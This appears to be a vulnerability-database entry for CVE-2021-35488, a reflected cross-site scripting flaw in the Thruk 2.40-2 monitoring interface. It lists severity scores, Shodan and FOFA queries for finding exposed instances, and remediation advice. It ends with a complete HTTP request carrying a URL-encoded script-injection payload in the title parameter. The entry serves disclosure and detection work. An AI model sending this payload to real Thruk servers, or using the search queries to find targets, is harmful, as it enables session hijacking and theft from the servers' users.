---
layout: post
cve_id: CVE-2021-35488
title: Thruk 2.40-2 - Cross-Site Scripting
pcap: true
pcap_path: /pcaps/2021/CVE-2021-35488.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-35488.yaml
snort2_rule: N/A
snort3_rule: N/A
author: arafatansari
severity: medium
impact: 'Successful exploitation of this vulnerability could allow an attacker to
  execute arbitrary JavaScript code in the context of the victim''s browser, leading
  to potential session hijacking, defacement, or theft of sensitive information.

  '
remediation: 'Upgrade to a patched version of Thruk or apply the vendor-supplied patch
  to mitigate this vulnerability.

  '
reference:
- https://www.gruppotim.it/redteam
- https://www.thruk.org/changelog.html
- https://nvd.nist.gov/vuln/detail/CVE-2021-35488
- https://github.com/ARPSyndicate/cvemon
- https://github.com/ARPSyndicate/kenzer-templates
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
  cvss-score: 6.1
  cve-id: CVE-2021-35488
  cwe-id: CWE-79
  epss-score: 0.12795
  epss-percentile: 0.93779
  cpe: cpe:2.3:a:thruk:thruk:2.40-2:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 1
  vendor: thruk
  product: thruk
  shodan-query:
  - http.html:"Thruk"
  - http.html:"thruk"
  fofa-query:
  - body="thruk"
  - title=="thruk monitoring webinterface"
tags:
- cve2021
- cve
- thruk
- xss
- vuln
---

## üîç Vulnerability Description
Thruk 2.40-2 contains a cross-site scripting vulnerability via /thruk/#cgi-bin/status.cgi?style=combined&title={TITLE] in the host or title parameter. An attacker can inject arbitrary JavaScript into status.cgi, leading to a triggered payload when accessed by an authenticated user.


## üåê HTTP Request
```nohighlight
GET /thruk/cgi-bin/login.cgi?thruk/cgi-bin/status.cgi%3fstyle=combined&title=%27%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.5.20) Gecko/ Firefox/3.6.14
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

